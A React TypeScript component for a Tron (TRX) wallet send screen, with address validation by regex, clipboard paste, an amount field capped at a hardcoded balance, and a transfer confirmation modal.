import { useState } from "react";
import { cn } from "@/lib/utils";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { TransferModalContent } from "./TransferModalContent";
import { AddressInput } from "./wallet/AddressInput";
import { AmountInput } from "./wallet/AmountInput";
import { useCryptoPrice } from "@/hooks/useCryptoPrice";
import { useBalanceTracker } from "@/hooks/useBalanceTracker";

export const TronWalletValidator = () => {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [isValid, setIsValid] = useState<boolean | null>(null);
  const [open, setOpen] = useState(false);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const { trxPrice } = useCryptoPrice();
  const maxAmount = 207.172222; // TRX balance

  const validateTronAddress = (address: string) => {
    const tronAddressRegex = /^T[A-Za-z0-9]{33}$/;
    return tronAddressRegex.test(address);
  };

  const handleAddressChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newAddress = e.target.value;
    setAddress(newAddress);
    
    if (newAddress.length > 0) {
      setIsValid(validateTronAddress(newAddress));
    } else {
      setIsValid(null);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      if (text.length > 0) {
        setIsValid(validateTronAddress(text));
      }
    } catch (err) {
      console.error("Failed to read clipboard:", err);
    }
  };

  const handleScan = () => {
    setOpen(true);
  };

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9.]/g, '');
    setAmount(value);
  };

  const handleMax = () => {
    setAmount(maxAmount.toString());
  };

  const handleClearAddress = () => {
    setAddress("");
    setIsValid(null);
  };

  const handleClearAmount = () => {
    setAmount("");
  };

  const isNextButtonEnabled = () => {
    const amountNum = parseFloat(amount);
    return (
      isValid === true &&
      amountNum > 0 &&
      amountNum <= maxAmount
    );
  };

  return (
    <div className="flex flex-col gap-4 w-full px-4 sm:px-6 mt-4 sm:mt-8">
      <AddressInput
        address={address}
        isValid={isValid}
        onAddressChange={handleAddressChange}
        onPaste={handlePaste}
        onScan={handleScan}
        onClear={handleClearAddress}
      />

      <AmountInput
        amount={amount}
        maxAmount={maxAmount}
        onAmountChange={handleAmountChange}
        onMax={handleMax}
        onClear={handleClearAmount}
      />

      <div className="fixed bottom-0 left-0 right-0 px-4 sm:px-6 py-4 bg-white">
        <Button
          onClick={() => setShowTransferModal(true)}
          className={cn(
            "w-full rounded-full",
            isNextButtonEnabled()
              ? "bg-blue-600 text-white hover:bg-blue-700"
              : "bg-gray-200 text-gray-500 hover:bg-gray-200 cursor-not-allowed"
          )}
          disabled={!isNextButtonEnabled()}
        >
          Next
        </Button>
      </div>
      <div className="pb-24"></div>

      <Dialog open={open} onOpenChange={setOpen} modal={false}>
        <DialogContent className="w-full max-w-[96vw] sm:max-w-[458px] border-0 bg-white p-0 shadow-none outline-none">
          <DialogHeader>
            <DialogTitle>Camera Permission Required</DialogTitle>
          </DialogHeader>
          <p className="text-sm text-muted-foreground">
            Please go to your Android device settings to enable camera permissions for this application.
          </p>
        </DialogContent>
      </Dialog>

      <Dialog open={showTransferModal} onOpenChange={setShowTransferModal}>
        <DialogContent className="w-full max-w-[96vw] sm:max-w-[458px] border-0 bg-white p-0 shadow-none outline-none">
          <TransferModalContent 
            amount={amount}
            address={address}
            trxPrice={trxPrice}
            onClose={() => setShowTransferModal(false)}
          />
        </DialogContent>
      </Dialog>
    </div>
  );
};
